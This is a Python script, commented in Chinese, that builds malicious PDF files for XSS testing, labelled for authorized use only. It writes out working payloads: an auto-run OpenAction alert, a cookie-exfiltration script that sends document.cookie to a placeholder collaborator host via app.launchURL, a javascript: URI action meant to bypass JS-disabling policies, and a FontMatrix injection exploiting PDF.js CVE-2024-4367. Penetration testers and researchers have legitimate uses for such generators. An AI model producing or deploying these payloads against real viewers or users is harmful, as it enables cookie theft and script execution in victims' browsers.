"""
PDF XSS 测试样本生成器（仅供授权安全测试使用）
优化点：
1. 底层直接构造PDF原始结构，无第三方依赖
2. 覆盖3种主流XSS触发场景
3. 兼容更多PDF阅读器/渲染器
"""
import os

# 输出目录
OUT_DIR = "xss_samples"
os.makedirs(OUT_DIR, exist_ok=True)


# ---------------------------------------------------------------
# 通用底层PDF构造器（自动处理对象、xref、trailer）
# ---------------------------------------------------------------
class PDFBuilder:
    def __init__(self):
        self.objects = {}    # 对象ID -> 字节内容
        self.order = []      # 对象写入顺序

    def add_object(self, obj_id: int, body: bytes):
        """添加PDF对象"""
        self.objects[obj_id] = body
        self.order.append(obj_id)

    def build(self) -> bytes:
        """构建完整PDF文件字节流"""
        out = bytearray()
        # PDF头部 + 二进制标记（确保阅读器识别为二进制文件）
        out += b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        offsets = {}

        # 写入所有对象
        for oid in self.order:
            offsets[oid] = len(out)
            out += f"{oid} 0 obj\n".encode()
            out += self.objects[oid]
            if not self.objects[oid].endswith(b"\n"):
                out += b"\n"
            out += b"endobj\n"

        # 生成交叉引用表(xref)
        xref_pos = len(out)
        max_obj_id = max(self.objects.keys())
        out += f"xref\n0 {max_obj_id + 1}\n".encode()
        out += b"0000000000 65535 f \n"  # 占位对象
        for i in range(1, max_obj_id + 1):
            if i in offsets:
                out += f"{offsets[i]:010d} 00000 n \n".encode()
            else:
                out += b"0000000000 00000 f \n"

        # 生成trailer和结束标记
        out += f"trailer\n<< /Size {max_obj_id + 1} /Root 1 0 R >>\n".encode()
        out += f"startxref\n{xref_pos}\n%%EOF\n".encode()
        return bytes(out)


# ---------------------------------------------------------------
# XSS样本1：OpenAction自动执行JavaScript（最通用场景）
# ---------------------------------------------------------------
def gen_xss_openaction_alert(filename: str):
    """打开PDF自动弹出提示框，测试基础JS执行能力"""
    pdf = PDFBuilder()
    # 1: 文档目录(Catalog)
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    # 2: 页面集合
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    # 3: 空白A4页面
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # 4: JavaScript动作对象
    js_payload = """
    app.alert({
        cMsg: "=== PDF XSS 测试成功 ===\\n阅读器类型: " + app.viewerType + "\\n仅用于授权测试！",
        cTitle: "XSS测试",
        nIcon: 3
    });
    """.strip()
    pdf.add_object(4, f"<< /S /JavaScript /JS ({js_payload}) >>".encode())
    
    # 保存文件
    with open(os.path.join(OUT_DIR, filename), "wb") as f:
        f.write(pdf.build())
    print(f"✅ 已生成: {filename} | 场景: 打开PDF自动弹框")


def gen_xss_openaction_exfil(filename: str, oob_server: str):
    """打开PDF自动外带数据，测试无回显场景的数据窃取"""
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # 外带阅读器信息+Cookie（浏览器上下文场景）
    js_payload = f"""
    try {{
        var leak_data = btoa("viewer=" + app.viewerType + "&cookie=" + document.cookie);
        app.launchURL("{oob_server}/xss?data=" + leak_data, true);
    }} catch(e) {{}}
    """.strip()
    pdf.add_object(4, f"<< /S /JavaScript /JS ({js_payload}) >>".encode())
    
    with open(os.path.join(OUT_DIR, filename), "wb") as f:
        f.write(pdf.build())
    print(f"✅ 已生成: {filename} | 场景: 无回显数据外带")


# ---------------------------------------------------------------
# XSS样本2：URI动作触发javascript伪协议（针对部分老旧渲染器）
# ---------------------------------------------------------------
def gen_xss_uri_javascript(filename: str):
    """通过URI动作触发javascript伪协议，绕过部分JS禁用策略"""
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # javascript伪协议，部分阅读器会直接在浏览器上下文执行
    pdf.add_object(4, b"<< /Type /Action /S /URI /URI (javascript:alert('PDF URI XSS: ' + document.domain)) >>")
    
    with open(os.path.join(OUT_DIR, filename), "wb") as f:
        f.write(pdf.build())
    print(f"✅ 已生成: {filename} | 场景: javascript伪协议绕过")


# ---------------------------------------------------------------
# XSS样本3：PDF.js FontMatrix注入（CVE-2024-4367漏洞复现）
# ---------------------------------------------------------------
def gen_pdfjs_fontmatrix_xss(filename: str):
    """针对PDF.js <4.3.136版本的FontMatrix注入漏洞"""
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 4 0 R >> >> >>")
    # 注入恶意FontMatrix，触发PDF.js的eval漏洞
    malicious_fm = b"[1 0 0 1 0 0 (1);alert('PDF.js CVE-2024-4367 触发成功');//]"
    pdf.add_object(4,
        b"<< /Type /Font /Subtype /Type3 "
        b"/FontBBox [0 0 100 100] "
        b"/FontMatrix " + malicious_fm + b" "
        b"/CharProcs << >> /Encoding << >> /Widths [] "
        b"/FirstChar 0 /LastChar 0 >>")
    
    with open(os.path.join(OUT_DIR, filename), "wb") as f:
        f.write(pdf.build())
    print(f"✅ 已生成: {filename} | 场景: PDF.js 历史漏洞复现")


# ---------------------------------------------------------------
# 主入口
# ---------------------------------------------------------------
if __name__ == "__main__":
    # 替换为你的DNSLog/Burp Collaborator地址
    OOB_SERVER = "http://your-collab-address.com"

    # 生成所有XSS样本
    print("="*50)
    print("📦 开始生成PDF XSS测试样本...")
    print("="*50)
    
    gen_xss_openaction_alert("01_xss_openaction_alert.pdf")
    gen_xss_openaction_exfil("02_xss_openaction_exfil.pdf", OOB_SERVER)
    gen_xss_uri_javascript("03_xss_uri_javascript.pdf")
    gen_pdfjs_fontmatrix_xss("04_pdfjs_cve_2024_4367.pdf")

    print("\n" + "="*50)
    print(f"📂 所有样本已输出到: ./{OUT_DIR}/")
    print("⚠️  仅用于授权安全测试，禁止非法使用！")
    print("="*50)
